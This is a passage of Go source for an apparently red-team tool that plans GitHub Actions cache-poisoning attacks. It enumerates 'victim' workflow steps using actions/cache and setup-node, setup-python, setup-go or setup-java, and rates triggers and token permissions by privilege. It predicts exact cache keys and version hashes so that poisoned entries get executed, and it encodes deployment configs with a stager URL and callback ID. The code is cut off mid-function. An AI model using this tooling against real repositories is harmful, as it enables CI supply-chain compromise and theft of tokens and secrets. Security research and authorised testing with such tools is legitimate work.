// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package cachepoison

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"

	poutinemodels "github.com/boostsecurityio/poutine/models"
)

const (
	StrategyActionsCache = "actions-cache"
	StrategySetupNode    = "setup-node"
	StrategySetupPython  = "setup-python"
	StrategySetupGo      = "setup-go"
	StrategySetupJava    = "setup-java"

	CacheEntryModePredicted   = "predicted"
	ExecutionKindCheckoutPost = "checkout_post"
	ExecutionKindDirectCache  = "direct_cache_exec"
)

type CacheEntryPlan struct {
	Mode                 string   `json:"mode,omitempty"`
	Strategy             string   `json:"strategy,omitempty"`
	ActionUses           string   `json:"action_uses,omitempty"`
	ActionRef            string   `json:"action_ref,omitempty"`
	PredictedKey         string   `json:"predicted_key,omitempty"`
	KeyTemplate          string   `json:"key_template,omitempty"`
	PathPatterns         []string `json:"path_patterns,omitempty"`
	EnableCrossOSArchive bool     `json:"enable_cross_os_archive,omitempty"`
	PackageManager       string   `json:"package_manager,omitempty"`
	CacheDependencyPath  string   `json:"cache_dependency_path,omitempty"`
	VersionSpec          string   `json:"version_spec,omitempty"`
	VersionFilePath      string   `json:"version_file_path,omitempty"`
}

type CheckoutTarget struct {
	Uses string `json:"uses,omitempty"`
	Ref  string `json:"ref,omitempty"`
}

type ExecutionPlan struct {
	Kind         string           `json:"kind,omitempty"`
	GadgetUses   string           `json:"gadget_uses,omitempty"`
	GadgetAction string           `json:"gadget_action,omitempty"`
	GadgetRef    string           `json:"gadget_ref,omitempty"`
	Checkouts    []CheckoutTarget `json:"checkouts,omitempty"`
	TargetPath   string           `json:"target_path,omitempty"`
}

type VictimCandidate struct {
	ID                  string         `json:"id"`
	Repository          string         `json:"repository,omitempty"`
	Workflow            string         `json:"workflow"`
	Job                 string         `json:"job,omitempty"`
	JobName             string         `json:"job_name,omitempty"`
	Trigger             string         `json:"trigger,omitempty"`
	TriggerMode         string         `json:"trigger_mode,omitempty"`
	ConsumerAction      string         `json:"consumer_action"`
	ConsumerLabel       string         `json:"consumer_label,omitempty"`
	Strategy            string         `json:"strategy"`
	CacheEntry          CacheEntryPlan `json:"cache_entry,omitempty"`
	Execution           ExecutionPlan  `json:"execution,omitempty"`
	KeyTemplate         string         `json:"key_template,omitempty"`
	PathPatterns        []string       `json:"path_patterns,omitempty"`
	PackageManager      string         `json:"package_manager,omitempty"`
	CacheDependencyPath string         `json:"cache_dependency_path,omitempty"`
	VersionSpec         string         `json:"version_spec,omitempty"`
	VersionFilePath     string         `json:"version_file_path,omitempty"`
	OverwriteTarget     string         `json:"overwrite_target,omitempty"`
	Ready               bool           `json:"ready"`
	Readiness           string         `json:"readiness,omitempty"`
	HasOIDC             bool           `json:"has_oidc,omitempty"`
	HasWrite            bool           `json:"has_write,omitempty"`
	GitHubTokenRW       bool           `json:"github_token_rw,omitempty"`
}

type DeploymentConfig struct {
	Candidate        VictimCandidate `json:"candidate"`
	VictimStagerURL  string          `json:"victim_stager_url"`
	VictimCallbackID string          `json:"victim_callback_id,omitempty"`
}

func (c DeploymentConfig) Encode() (string, error) {
	data, err := json.Marshal(c)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func DecodeDeploymentConfig(value string) (DeploymentConfig, error) {
	var cfg DeploymentConfig
	raw, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return cfg, err
	}
	err = json.Unmarshal(raw, &cfg)
	return cfg, err
}

func SupportedVictimActions() []string {
	return []string{
		"actions/cache",
		"actions/cache/restore",
		"actions/setup-node",
		"actions/setup-python",
		"actions/setup-go",
		"actions/setup-java",
	}
}

func ClassifyWriterEligible(ruleID, trigger string) (eligible bool, reason string) {
	switch ruleID {
	case "injection", "untrusted_checkout_exec":
	default:
		reason = "selected vulnerability does not provide a supported writer payload path"
		return
	}

	trigger = strings.ToLower(strings.TrimSpace(trigger))
	if trigger == "" || trigger == "unknown" {
		reason = "workflow trigger is unknown"
		return
	}

	privilegedTriggers := []string{
		"issues",
		"issue_comment",
		"pull_request_target",
		"push",
		"workflow_dispatch",
		"schedule",
		"workflow_run",
		"release",
		"repository_dispatch",
	}
	for _, candidate := range privilegedTriggers {
		if strings.Contains(trigger, candidate) {
			eligible = true
			return
		}
	}

	reason = "selected workflow does not run in a supported cache-writer context"
	return
}

func CollectVictimCandidates(repository, root string, workflow poutinemodels.GithubActionsWorkflow) []VictimCandidate {
	triggerNames := workflowEventNames(workflow.Events)
	trigger := strings.Join(triggerNames, ", ")
	triggerMode := classifyTriggerMode(triggerNames)
	workflowHasOIDC, workflowHasWrite := permissionsState(workflow.Permissions)

	var candidates []VictimCandidate
	for stepIdx, jobCandidate := range collectJobVictims(repository, root, workflow, trigger, triggerMode, workflowHasOIDC, workflowHasWrite) {
		jobCandidate.ID = fmt.Sprintf("%s:%s:%s:%s:%d", repository, workflow.Path, jobCandidate.Job, jobCandidate.ConsumerAction, stepIdx)
		candidates = append(candidates, jobCandidate)
	}
	return candidates
}

func collectJobVictims(repository, root string, workflow poutinemodels.GithubActionsWorkflow, trigger, triggerMode string, workflowHasOIDC, workflowHasWrite bool) []VictimCandidate {
	var candidates []VictimCandidate
	for _, job := range workflow.Jobs {
		jobHasOIDC, jobHasWrite := permissionsState(job.Permissions)
		jobHasOIDC = jobHasOIDC || workflowHasOIDC
		jobHasWrite = jobHasWrite || workflowHasWrite
		jobGitHubTokenRW := hasContentsWrite(job.Permissions)
		checkouts := collectCheckoutTargets(job)

		for stepIdx, step := range job.Steps {
			action, ref := parseActionReference(step.Uses)
			if action == "" {
				continue
			}
			switch action {
			case "actions/cache", "actions/cache/restore":
				keyTemplate := withValue(step.With, "key")
				paths := splitMultilineValue(withValue(step.With, "path"))
				execution := detectActionsCacheExecutionPlan(step, action, ref, paths, checkouts, job.Steps[stepIdx+1:])
				ready := keyTemplate != "" && len(paths) > 0 && KeyTemplateSupported(keyTemplate) && execution.Kind != ""
				readiness := "missing cache key or cache path"
				if !ready && keyTemplate != "" && len(paths) > 0 {
					if !KeyTemplateSupported(keyTemplate) {
						readiness = "cache key uses unsupported expressions"
					} else {
						readiness = "no executed file found under restored cache path"
					}
				}
				if ready {
					readiness = "ready"
				}
				cacheEntry := CacheEntryPlan{
					Mode:                 CacheEntryModePredicted,
					Strategy:             StrategyActionsCache,
					ActionUses:           step.Uses,
					ActionRef:            ref,
					KeyTemplate:          keyTemplate,
					PathPatterns:         append([]string(nil), paths...),
					EnableCrossOSArchive: strings.EqualFold(withValue(step.With, "enableCrossOsArchive"), "true"),
				}
				candidate := VictimCandidate{
					Repository:      repository,
					Workflow:        workflow.Path,
					Job:             job.ID,
					JobName:         job.Name,
					Trigger:         trigger,
					TriggerMode:     triggerMode,
					ConsumerAction:  action,
					ConsumerLabel:   action,
					Strategy:        StrategyActionsCache,
					CacheEntry:      cacheEntry,
					Execution:       execution,
					KeyTemplate:     keyTemplate,
					PathPatterns:    paths,
					OverwriteTarget: executionPlanLabel(execution),
					Ready:           ready,
					Readiness:       readiness,
					HasOIDC:         jobHasOIDC,
					HasWrite:        jobHasWrite,
					GitHubTokenRW:   jobGitHubTokenRW,
				}
				candidates = append(candidates, hydratePredictedCacheEntry(root, candidate))
			case "actions/setup-node":
				packageManager := strings.ToLower(withValue(step.With, "cache"))
				execution := checkoutExecutionPlan(step.Uses, action, ref, checkouts)
				ready := (packageManager == "npm" || packageManager == "pnpm" || packageManager == "yarn") && execution.Kind != ""
				readiness := "unsupported package manager"
				if packageManager == "" {
					readiness = "step does not enable setup-node cache"
				} else if execution.Kind == "" {
					readiness = "job has no actions/checkout step"
				}
				if ready {
					readiness = "ready"
				}
				label := action
				if packageManager != "" {
					label = action + " (" + packageManager + ")"
				}
				cacheEntry := CacheEntryPlan{
					Mode:                CacheEntryModePredicted,
					Strategy:            StrategySetupNode,
					ActionUses:          step.Uses,
					ActionRef:           ref,
					PackageManager:      packageManager,
					CacheDependencyPath: withValue(step.With, "cache-dependency-path"),
				}
				candidate := VictimCandidate{
					Repository:          repository,
					Workflow:            workflow.Path,
					Job:                 job.ID,
					JobName:             job.Name,
					Trigger:             trigger,
					TriggerMode:         triggerMode,
					ConsumerAction:      action,
					ConsumerLabel:       label,
					Strategy:            StrategySetupNode,
					CacheEntry:          cacheEntry,
					Execution:           execution,
					PackageManager:      packageManager,
					CacheDependencyPath: withValue(step.With, "cache-dependency-path"),
					OverwriteTarget:     executionPlanLabel(execution),
					Ready:               ready,
					Readiness:           readiness,
					HasOIDC:             jobHasOIDC,
					HasWrite:            jobHasWrite,
					GitHubTokenRW:       jobGitHubTokenRW,
				}
				candidates = append(candidates, hydratePredictedCacheEntry(root, candidate))
			case "actions/setup-go":
				versionSpec, versionFilePath, ready, readiness := classifySetupGoVictim(root, step)
				execution := checkoutExecutionPlan(step.Uses, action, ref, checkouts)
				if ready && execution.Kind == "" {
					ready = false
					readiness = "job has no actions/checkout step"
				}
				cacheEntry := CacheEntryPlan{
					Mode:                CacheEntryModePredicted,
					Strategy:            StrategySetupGo,
					ActionUses:          step.Uses,
					ActionRef:           ref,
					CacheDependencyPath: withValue(step.With, "cache-dependency-path"),
					VersionSpec:         versionSpec,
					VersionFilePath:     versionFilePath,
				}
				candidate := VictimCandidate{
					Repository:          repository,
					Workflow:            workflow.Path,
					Job:                 job.ID,
					JobName:             job.Name,
					Trigger:             trigger,
					TriggerMode:         triggerMode,
					ConsumerAction:      action,
					ConsumerLabel:       action,
					Strategy:            StrategySetupGo,
					CacheEntry:          cacheEntry,
					Execution:           execution,
					CacheDependencyPath: withValue(step.With, "cache-dependency-path"),
					VersionSpec:         versionSpec,
					VersionFilePath:     versionFilePath,
					OverwriteTarget:     executionPlanLabel(execution),
					Ready:               ready,
					Readiness:           readiness,
					HasOIDC:             jobHasOIDC,
					HasWrite:            jobHasWrite,
					GitHubTokenRW:       jobGitHubTokenRW,
				}
				candidates = append(candidates, hydratePredictedCacheEntry(root, candidate))
			case "actions/setup-python", "actions/setup-java":
				strategy := StrategySetupPython
				if action == "actions/setup-java" {
					strategy = StrategySetupJava
				}
				candidate := VictimCandidate{
					Repository:      repository,
					Workflow:        workflow.Path,
					Job:             job.ID,
					JobName:         job.Name,
					Trigger:         trigger,
					TriggerMode:     triggerMode,
					ConsumerAction:  action,
					ConsumerLabel:   action,
					Strategy:        strategy,
					OverwriteTarget: "actions/checkout post",
					Ready:           false,
					Readiness:       "cataloged victim; key prediction not implemented yet",
					HasOIDC:         jobHasOIDC,
					HasWrite:        jobHasWrite,
					GitHubTokenRW:   jobGitHubTokenRW,
				}
				candidates = append(candidates, hydratePredictedCacheEntry(root, candidate))
			}
		}
	}
	return candidates
}

func collectCheckoutTargets(job poutinemodels.GithubActionsJob) []CheckoutTarget {
	var targets []CheckoutTarget
	for _, step := range job.Steps {
		action, ref := parseActionReference(step.Uses)
		if action != "actions/checkout" {
			continue
		}
		targets = append(targets, CheckoutTarget{
			Uses: step.Uses,
			Ref:  ref,
		})
	}
	return targets
}

func checkoutExecutionPlan(uses, action, ref string, checkouts []CheckoutTarget) ExecutionPlan {
	if len(checkouts) == 0 {
		return ExecutionPlan{}
	}
	cloned := make([]CheckoutTarget, len(checkouts))
	copy(cloned, checkouts)
	return ExecutionPlan{
		Kind:         ExecutionKindCheckoutPost,
		GadgetUses:   uses,
		GadgetAction: action,
		GadgetRef:    ref,
		Checkouts:    cloned,
	}
}

func detectActionsCacheExecutionPlan(step poutinemodels.GithubActionsStep, action, ref string, paths []string, checkouts []CheckoutTarget, laterSteps poutinemodels.GithubActionsSteps) ExecutionPlan {
	if len(checkouts) > 0 {
		return checkoutExecutionPlan(checkouts[0].Uses, "actions/checkout", checkouts[0].Ref, checkouts)
	}
	targetPath := findExecutedCacheTarget(paths, laterSteps)
	if targetPath == "" {
		return ExecutionPlan{}
	}
	return ExecutionPlan{
		Kind:         ExecutionKindDirectCache,
		GadgetUses:   step.Uses,
		GadgetAction: action,
		GadgetRef:    ref,
		TargetPath:   targetPath,
	}
}

func executionPlanLabel(plan ExecutionPlan) string {
	switch plan.Kind {
	case ExecutionKindDirectCache:
		if plan.TargetPath != "" {
			return "direct cache exec · " + plan.TargetPath
		}
		return "direct cache exec"
	case ExecutionKindCheckoutPost:
		return "actions/checkout post"
	default:
		return ""
	}
}

func KeyTemplateSupported(template string) bool {
	for _, expr := range templateExprPattern.FindAllStringSubmatch(template, -1) {
		if len(expr) != 2 {
			return false
		}
		if !supportsTemplateExpression(strings.TrimSpace(expr[1])) {
			return false
		}
	}
	return true
}

func EvaluateKeyTemplate(root, template string) (string, error) {
	var evalErr error
	rendered := templateExprPattern.ReplaceAllStringFunc(template, func(raw string) string {
		match := templateExprPattern.FindStringSubmatch(raw)
		if len(match) != 2 {
			evalErr = fmt.Errorf("invalid template expression %q", raw)
			return ""
		}
		value, err := evaluateTemplateExpression(root, strings.TrimSpace(match[1]))
		if err != nil {
			evalErr = err
			return ""
		}
		return value
	})
	if evalErr != nil {
		return "", evalErr
	}
	return strings.TrimSpace(rendered), nil
}

func ComputeCacheEntry(root string, candidate VictimCandidate) (key, version string, err error) {
	plan := cacheEntryPlan(candidate)
	switch plan.Strategy {
	case StrategyActionsCache:
		key, err = EvaluateKeyTemplate(root, plan.KeyTemplate)
		if err != nil {
			return "", "", err
		}
		version, err = CalculateVersionFromPatterns(root, plan.PathPatterns, plan.EnableCrossOSArchive)
		if err != nil {
			return "", "", err
		}
		return key, version, nil
	case StrategySetupNode:
		return ComputeSetupNodeEntry(root, plan.PackageManager, plan.CacheDependencyPath)
	case StrategySetupGo:
		versionSpec := strings.TrimSpace(plan.VersionSpec)
		if versionSpec == "" && strings.TrimSpace(plan.VersionFilePath) != "" {
			versionSpec, err = parseSetupGoVersionFile(root, plan.VersionFilePath)
			if err != nil {
				return "", "", err
			}
		}
		return ComputeSetupGoEntry(root, versionSpec, plan.CacheDependencyPath)
	default:
		return "", "", fmt.Errorf("strategy %s is not runtime-ready", plan.Strategy)
	}
}

func cacheEntryPlan(candidate VictimCandidate) CacheEntryPlan {
	if candidate.CacheEntry.Mode != "" {
		return candidate.CacheEntry
	}
	return CacheEntryPlan{
		Mode:                 CacheEntryModePredicted,
		Strategy:             candidate.Strategy,
		ActionUses:           candidate.CacheEntry.ActionUses,
		ActionRef:            candidate.CacheEntry.ActionRef,
		PredictedKey:         candidate.CacheEntry.PredictedKey,
		KeyTemplate:          candidate.KeyTemplate,
		PathPatterns:         append([]string(nil), candidate.PathPatterns...),
		EnableCrossOSArchive: candidate.CacheEntry.EnableCrossOSArchive,
		PackageManager:       candidate.PackageManager,
		CacheDependencyPath:  candidate.CacheDependencyPath,
		VersionSpec:          candidate.VersionSpec,
		VersionFilePath:      candidate.VersionFilePath,
	}
}

func hydratePredictedCacheEntry(root string, candidate VictimCandidate) VictimCandidate {
	if strings.TrimSpace(root) == "" || !candidate.Ready || candidate.CacheEntry.Mode != CacheEntryModePredicted {
		return candidate
	}
	key, _, err := ComputeCacheEntry(root, candidate)
	if err != nil || strings.TrimSpace(key) == "" {
		return candidate
	}
	candidate.CacheEntry.PredictedKey = strings.TrimSpace(key)
	return candidate
}

func executionPlan(candidate VictimCandidate) ExecutionPlan {
	if candidate.Execution.Kind != "" {
		return candidate.Execution
	}
	if candidate.OverwriteTarget == "actions/checkout post" {
		return ExecutionPlan{Kind: ExecutionKindCheckoutPost}
	}
	return ExecutionPlan{}
}

func ComputeSetupNodeEntry(root, packageManager, dependencyPath string) (key, version string, err error) {
	packageManager = strings.ToLower(strings.TrimSpace(packageManager))
	if packageManager != "npm" && packageManager != "pnpm" && packageManager != "yarn" {
		return "", "", fmt.Errorf("unsupported setup-node cache package manager %q", packageManager)
	}

	lockHash, err := hashSetupNodeDependencyFiles(root, packageManager, dependencyPath)
	if err != nil {
		return "", "", err
	}

	platform := runnerOS()

	arch := os.Getenv("RUNNER_ARCH")
	if arch == "" {
		switch runtime.GOARCH {
		case "amd64":
			arch = "x64"
		case "arm64":
			arch = "arm64"
		default:
			arch = runtime.GOARCH
		}
	} else {
		arch = strings.ToLower(arch)
		if arch == "x64" {
			arch = "x64"
		}
	}

	key = fmt.Sprintf("node-cache-%s-%s-%s-%s", platform, arch, packageManager, lockHash)
	cacheDirs, err := nodeCacheDirectories(packageManager, root)
	if err != nil {
		return "", "", err
	}
	version = CalculateCacheVersion(cacheDirs)
	return key, version, nil
}

func ComputeSetupGoEntry(root, versionSpec, dependencyPath string) (key, version string, err error) {
	versionSpec = strings.TrimSpace(versionSpec)
	if !exactGoVersionPattern.MatchString(versionSpec) {
		return "", "", fmt.Errorf("setup-go version %q is not an exact supported release", versionSpec)
	}

	fileHash, err := hashSetupGoDependencyFiles(root, dependencyPath)
	if err != nil {
		return "", "", err
	}
	if fileHash == "" {
		return "", "", fmt.Errorf("setup-go dependency hash is empty")
	}

	platform := runnerOS()
	arch := setupGoArch()
	linuxVersion := ""
	if platform == "Linux" {
		linuxVersion = strings.TrimSpace(os.Getenv("ImageOS")) + "-"
	}

	key = fmt.Sprintf("setup-go-%s-%s-%sgo-%s-%s", platform, arch, linuxVersion, versionSpec, fileHash)
	cacheDirs, err := setupGoCacheDirectories(root)
	if err != nil {
		return "", "", err
	}
	version = CalculateCacheVersion(cacheDirs)
	return key, version, nil
}

func CalculateVersionFromPatterns(root string, patterns []string, enableCrossOSArchive bool) (string, error) {
	paths, err := ResolveCachePaths(root, patterns)
	if err != nil {
		return "", err
	}
	if len(paths) == 0 {
		return "", fmt.Errorf("no cache paths resolved for %s", strings.Join(patterns, ", "))
	}
	return CalculateCacheVersionForOS(paths, runnerOS(), enableCrossOSArchive), nil
}

func CalculateCacheVersion(paths []string) string {
	return CalculateCacheVersionForOS(paths, runnerOS(), false)
}

func CalculateCacheVersionForOS(paths []string, osName string, enableCrossOSArchive bool) string {
	components := append([]string{}, paths...)
	components = append(components, "zstd-without-long", "1.0")
	if strings.EqualFold(osName, "windows") && !enableCrossOSArchive {
		components = append(components, "windows-only")
	}
	sum := sha256.Sum256([]byte(strings.Join(components, "|")))
	return hex.EncodeToString(sum[:])
}

func ResolveCachePaths(root string, patterns []string) ([]string, error) {
	root = normalizeWorkspace(root)
	if len(patterns) == 0 {
		return nil, nil
	}

	var paths []string
	seen := make(map[string]struct{})
	var globPatterns []string

	for _, raw := range patterns {
		pattern := strings.TrimSpace(filepath.ToSlash(raw))
		if pattern == "" {
			continue
		}
		if !hasCacheGlob(pattern) {
			resolved, ok, err := resolveLiteralCachePath(root, pattern)
			if err != nil {
				return nil, err
			}
			if !ok {
				continue
			}
			if _, exists := seen[resolved]; exists {
				continue
			}
			seen[resolved] = struct{}{}
			paths = append(paths, resolved)
			continue
		}
		globPatterns = append(globPatterns, pattern)
	}

	if len(globPatterns) == 0 {
		return paths, nil
	}

	type match struct {
		path  string
		isDir bool
	}
	globMatches := make(map[string]match)
	err := filepath.WalkDir(root, func(current string, entry fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}

		rel, err := filepath.Rel(root, current)
		if err != nil {
			return err
		}
		rel = filepath.ToSlash(rel)
		if rel == "." {
			rel = "."
		}

		for _, pattern := range globPatterns {
			pattern = strings.TrimSpace(filepath.ToSlash(pattern))
			if pattern == "" {
				continue
			}
			ok, err := matchCachePattern(rel, pattern)
			if err != nil {
				return err
			}
			if ok {
				globMatches[rel] = match{path: rel, isDir: entry.IsDir()}
				break
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}

	matches := make([]match, 0, len(globMatches))
	for _, item := range globMatches {
		if item.path == "." {
			continue
		}
		matches = append(matches, item)
	}
	sort.Slice(matches, func(i, j int) bool {
		if matches[i].isDir != matches[j].isDir {
			return matches[i].isDir
		}
		return matches[i].path < matches[j].path
	})

	for _, item := range matches {
		if _, exists := seen[item.path]; exists {
			continue
		}
		seen[item.path] = struct{}{}
		paths = append(paths, item.path)
	}
	return paths, nil
}

func hasCacheGlob(pattern string) bool {
	return strings.ContainsAny(pattern, "*?[")
}

func resolveLiteralCachePath(root, pattern string) (resolvedPath string, exists bool, err error) {
	targetPath, err := absoluteCachePatternPath(root, pattern)
	if err != nil {
		return "", false, err
	}
	info, err := os.Stat(targetPath)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return "", false, nil
		}
		return "", false, err
	}
	if !info.IsDir() && !info.Mode().IsRegular() {
		return "", false, nil
	}
	if isRelativeCachePattern(pattern) {
		return normalizeRelativeCachePattern(pattern), true, nil
	}
	resolvedPath, err = filepath.Rel(root, targetPath)
	if err != nil {
		return "", false, err
	}
	resolvedPath = filepath.ToSlash(resolvedPath)
	if resolvedPath == "" {
		resolvedPath = "."
	}
	return resolvedPath, true, nil
}

func absoluteCachePatternPath(root, pattern string) (string, error) {
	normalized := filepath.FromSlash(strings.TrimSpace(pattern))
	switch {
	case strings.HasPrefix(pattern, "~/"):
		home, err := os.UserHomeDir()
		if err != nil {
			return "", err
		}
		return filepath.Join(home, normalized[2:]), nil
	case filepath.IsAbs(normalized):
		return normalized, nil
	default:
		return filepath.Join(root, normalized), nil
	}
}

func isRelativeCachePattern(pattern string) bool {
	normalized := filepath.FromSlash(strings.TrimSpace(pattern))
	return !filepath.IsAbs(normalized) && !strings.HasPrefix(pattern, "~/")
}

func normalizeRelativeCachePattern(pattern string) string {
	pattern = strings.TrimSpace(filepathToSlash(pattern))
	switch {
	case pattern == "", pattern == ".", pattern == "./":
		return "."
	case strings.HasPrefix(pattern, "./"):
		cleaned := path.Clean(strings.TrimPrefix(pattern, "./"))
		if cleaned == "." {
			return "."
		}
		return "./" + strings.TrimPrefix(cleaned, "./")
	case strings.HasPrefix(pattern, "../"):
		return path.Clean(pattern)
	default:
		return path.Clean(pattern)
	}
}

func workflowEventNames(events poutinemodels.GithubActionsEvents) []string {
	names := make([]string, 0, len(events))
	for _, event := range events {
		if strings.TrimSpace(event.Name) != "" {
			names = append(names, event.Name)
		}
	}
	return names
}

func classifyTriggerMode(triggers []string) string {
	for _, trigger := range triggers {
		if trigger == "schedule" {
			return "scheduled"
		}
	}
	for _, trigger := range triggers {
		if trigger == "workflow_dispatch" {
			return "manual"
		}
	}
	if len(triggers) == 0 {
		return "unknown"
	}
	return "automatic"
}

func permissionsState(perms poutinemodels.GithubActionsPermissions) (hasOIDC, hasWrite bool) {
	for _, perm := range perms {
		if perm.Scope == "id-token" && perm.Permission == "write" {
			hasOIDC = true
		}
		if perm.Permission == "write" {
			hasWrite = true
		}
	}
	return hasOIDC, hasWrite
}

func hasContentsWrite(perms poutinemodels.GithubActionsPermissions) bool {
	for _, perm := range perms {
		if perm.Scope == "contents" && perm.Permission == "write" {
			return true
		}
	}
	return false
}

func withValue(values []poutinemodels.GithubActionsEnv, key string) string {
	for _, value := range values {
		if value.Name == key {
			return strings.TrimSpace(value.Value)
		}
	}
	return ""
}

func splitMultilineValue(value string) []string {
	if value == "" {
		return nil
	}
	parts := strings.Split(value, "\n")
	var result []string
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part != "" {
			result = append(result, part)
		}
	}
	return result
}

func parseActionReference(uses string) (action, ref string) {
	action, ref, _ = strings.Cut(uses, "@")
	return
}

var templateExprPattern = regexp.MustCompile(`\$\{\{\s*(.*?)\s*\}\}`)
var hashFilesPattern = regexp.MustCompile(`^hashFiles\((.*)\)$`)
var singleQuoteArgPattern = regexp.MustCompile(`'([^']*)'|"([^"]*)"`)
var toolchainGoVersionPattern = regexp.MustCompile(`(?m)^toolchain go(1\.\d+(?:\.\d+|beta\d+|rc\d+)?)$`)
var directiveGoVersionPattern = regexp.MustCompile(`(?m)^go (\d+(?:\.\d+)*)$`)
var toolVersionsGoPattern = regexp.MustCompile(`(?m)^golang\s+([^\n#]+)$`)
var exactGoVersionPattern = regexp.MustCompile(`^1\.\d+(?:\.\d+|beta\d+|rc\d+)$`)

func supportsTemplateExpression(expr string) bool {
	if expr == "runner.os" || expr == "runner.arch" || expr == "github.ref" || expr == "github.ref_name" || expr == "github.base_ref" || expr == "github.head_ref" || expr == "github.repository" {
		return true
	}
	return hashFilesPattern.MatchString(expr)
}

func evaluateTemplateExpression(root, expr string) (string, error) {
	switch expr {
	case "runner.os":
		return runnerOS(), nil
	case "runner.arch":
		if value := os.Getenv("RUNNER_ARCH"); value != "" {
			return value, nil
		}
		switch runtime.GOARCH {
		case "amd64":
			return "X64", nil
		case "arm64":
			return "ARM64", nil
		default:
			return strings.ToUpper(runtime.GOARCH), nil
		}
	case "github.ref":
		return os.Getenv("GITHUB_REF"), nil
	case "github.ref_name":
		return os.Getenv("GITHUB_REF_NAME"), nil
	case "github.base_ref":
		return os.Getenv("GITHUB_BASE_REF"), nil
	case "github.head_ref":
		return os.Getenv("GITHUB_HEAD_REF"), nil
	case "github.repository":
		return os.Getenv("GITHUB_REPOSITORY"), nil
	}

	match := hashFilesPattern.FindStringSubmatch(expr)
	if len(match) != 2 {
		return "", fmt.Errorf("unsupported cache key expression %q", expr)
	}

	var patterns []string
	for _, arg := range singleQuoteArgPattern.FindAllStringSubmatch(match[1], -1) {
		value := arg[1]
		if value == "" {
			value = arg[2]
		}
		if value != "" {
			patterns = append(patterns, value)
		}
	}
	if len(patterns) == 0 {
		return "", fmt.Errorf("hashFiles expression %q has no patterns", expr)
	}
	return HashFiles(root, patterns)
}

func HashFiles(root string, patterns []string) (string, error) {
	root = normalizeWorkspace(root)
	files, err := findMatchingFiles(root, patterns)
	if err != nil {
		return "", err
	}
	if len(files) == 0 {
		return "", nil
	}

	outer := sha256.New()
	for _, file := range files {
		inner, err := sha256File(filepath.Join(root, filepath.FromSlash(file)))
		if err != nil {
			return "", err
		}
		_, _ = outer.Write(inner)
	}
	return hex.EncodeToString(outer.Sum(nil)), nil
}

func hashSetupNodeDependencyFiles(root, packageManager, dependencyPath string) (string, error) {
	if dependencyPath == "" {
		lockFiles := map[string][]string{
			"npm":  {"package-lock.json", "npm-shrinkwrap.json", "yarn.lock"},
			"pnpm": {"pnpm-lock.yaml"},
			"yarn": {"yarn.lock"},
		}[packageManager]
		for _, name := range lockFiles {
			candidate := filepath.Join(root, name)
			if _, err := os.Stat(candidate); err == nil {
				return HashFiles(root, []string{name})
			}
		}
		return "", fmt.Errorf("no supported %s lock file found under %s", packageManager, root)
	}
	return HashFiles(root, splitMultilineValue(dependencyPath))
}

func hashSetupGoDependencyFiles(root, dependencyPath string) (string, error) {
	if dependencyPath == "" {
		candidate := filepath.Join(root, "go.sum")
		if _, err := os.Stat(candidate); err != nil {
			return "", fmt.Errorf("setup-go default dependency file %s was not found", candidate)
		}
		return HashFiles(root, []string{"go.sum"})
	}
	return HashFiles(root, splitMultilineValue(dependencyPath))
}

func nodeCacheDirectories(packageManager, root string) ([]string, error) {
	switch packageManager {
	case "npm":
		value, err := commandOutput(root, "npm", "config", "get", "cache")
		if err != nil || strings.TrimSpace(value) == "" {
			home, _ := os.UserHomeDir()
			return []string{filepath.Join(home, ".npm")}, nil
		}
		return []string{strings.TrimSpace(value)}, nil
	case "pnpm":
		value, err := commandOutput(root, "pnpm", "store", "path", "--silent")
		if err != nil || strings.TrimSpace(value) == "" {
			home, _ := os.UserHomeDir()
			return []string{filepath.Join(home, ".pnpm-store")}, nil
		}
		return []string{strings.TrimSpace(value)}, nil
	case "yarn":
		version, err := commandOutput(root, "yarn", "--version")
		if err != nil {
			return nil, err
		}
		version = strings.TrimSpace(version)
		var value string
		if strings.HasPrefix(version, "1.") {
			value, err = commandOutput(root, "yarn", "cache", "dir")
		} else {
			value, err = commandOutput(root, "yarn", "config", "get", "cacheFolder")
		}
		if err != nil || strings.TrimSpace(value) == "" {
			home, _ := os.UserHomeDir()
			return []string{filepath.Join(home, ".cache", "yarn")}, nil
		}
		return []string{strings.TrimSpace(value)}, nil
	default:
		return nil, fmt.Errorf("unsupported package manager %q", packageManager)
	}
}

func setupGoCacheDirectories(root string) ([]string, error) {
	gomodcache := firstNonEmpty(
		strings.TrimSpace(os.Getenv("GOMODCACHE")),
		commandOutputOrEmpty(root, "go", "env", "GOMODCACHE"),
		defaultGoModCacheDir(),
	)
	gocache := firstNonEmpty(
		strings.TrimSpace(os.Getenv("GOCACHE")),
		commandOutputOrEmpty(root, "go", "env", "GOCACHE"),
		defaultGoBuildCacheDir(),
	)
	if gomodcache == "" || gocache == "" {
		return nil, fmt.Errorf("could not determine setup-go cache directories")
	}
	return []string{gomodcache, gocache}, nil
}

func commandOutput(root, name string, args ...string) (output string, err error) {
	cmd := exec.Command(name, args...)
	cmd.Dir = normalizeWorkspace(root)
	rawOutput, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s %s: %w", name, strings.Join(args, " "), err)
	}
	output = strings.TrimSpace(string(rawOutput))
	return output, nil
}

func commandOutputOrEmpty(root, name string, args ...string) (output string) {
	value, err := commandOutput(root, name, args...)
	if err != nil {
		return ""
	}
	output = strings.TrimSpace(value)
	return output
}

func normalizeWorkspace(root string) string {
	root = strings.TrimSpace(root)
	if root != "" {
		return root
	}
	if value := strings.TrimSpace(os.Getenv("GITHUB_WORKSPACE")); value != "" {
		return value
	}
	value, err := os.Getwd()
	if err == nil {
		return value
	}
	return "."
}

func classifySetupGoVictim(root string, step poutinemodels.GithubActionsStep) (versionSpec, versionFilePath string, ready bool, readiness string) {
	cacheInput := strings.ToLower(strings.TrimSpace(withValue(step.With, "cache")))
	if cacheInput == "false" {
		readiness = "step disables setup-go cache"
		return
	}

	dependencyPath := strings.TrimSpace(withValue(step.With, "cache-dependency-path"))
